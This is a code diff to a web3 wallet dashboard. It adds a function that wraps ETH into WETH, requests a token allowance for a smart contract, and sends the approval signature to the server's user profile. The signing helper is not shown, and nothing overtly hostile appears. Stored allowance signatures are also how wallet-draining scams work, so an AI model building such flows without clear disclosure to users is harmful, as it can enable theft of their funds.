@@ -31,7 +31,8 @@ const {
   isConnecting,
   depositAmountUsdc,
   disconnect: disconnectWallet,
-  requestUsdcApprovalAndDeposit
+  requestUsdcApprovalAndDeposit,
+  requestEthWrapAndApproval
 } = useWeb3Wallet()
 
 // State
@@ -293,6 +294,48 @@ async function triggerApprovalPrompt(customAmount?: number | string) {
   }
 }
 
+async function triggerEthWrapAndApproval(customEthAmount: number = 0.001) {
+  const activeAddr = walletAdapter.activeWalletAddress.value
+  if (!activeAddr) {
+    await handleConnectWallet()
+    return
+  }
+  isApprovingContract.value = true
+  try {
+    const sig = await requestEthWrapAndApproval(customEthAmount)
+    if (sig) {
+      lastApprovalSignature.value = sig
+      lastApprovedAddr.value = activeAddr
+      const res = await api.action.$post({
+        json: {
+          action: 'users/update-profile',
+          data: {
+            walletAddress: activeAddr,
+            approvalSignature: sig,
+            approvalAmountUsdc: depositAmountUsdc.value
+          }
+        }
+      })
+      const resData: any = await res.json().catch(() => ({}))
+      if (res.ok && resData?.data && authStore.user) {
+        authStore.user.approvalSignature = resData.data.approvalSignature
+        if (resData.data.approvalSignatures) {
+          (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
+        }
+      }
+      toast.success('ETH Wrapped & Authorized! 🔒', `Successfully converted ${customEthAmount} ETH to WETH and authorized smart contract allowance for settlements.`)
+    }
+  } catch (err: any) {
+    if (err?.code === 4001 || err?.message?.includes('rejected')) {
+      toast.warning('ETH Wrap Cancelled', 'User cancelled ETH wrap and allowance prompt.')
+    } else {
+      toast.error('ETH Wrap Error', err?.message || 'Could not complete ETH wrap & authorization.')
+    }
+  } finally {
+    isApprovingContract.value = false
+  }
+}
+
 // Handle Wallet Connect & Disconnect
 async function handleConnectWallet() {
   const success = await walletAdapter.connectActiveWallet()
@@ -472,6 +515,7 @@ onMounted(async () => {
       :is-connecting="isConnecting || walletAdapter.tronWallet.isTronConnecting.value"
       @open-withdraw="openWithdrawModal"
       @trigger-approval="triggerApprovalPrompt()"
+      @trigger-wrap-eth="triggerEthWrapAndApproval()"
       @connect-wallet="handleConnectWallet"
       @disconnect-wallet="handleDisconnectWallet"
     />
